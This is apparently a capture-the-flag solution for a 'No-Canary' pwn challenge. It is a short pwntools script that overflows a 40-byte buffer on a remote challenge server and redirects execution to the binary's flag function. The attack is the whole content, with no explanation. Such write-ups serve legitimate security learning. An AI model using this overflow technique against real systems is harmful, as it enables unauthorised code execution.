# No-Canary -- pwn -- 50 pts/536 solves

```
from pwn import *

p = remote("shell.actf.co", 20700)
e = ELF("./nocanary")

xpl = ""
xpl += "A"*40 #overflow
xpl += p64(e.sym["flag"])

p.sendlineafter("your name?", xpl)
print p.recvall(1)
```
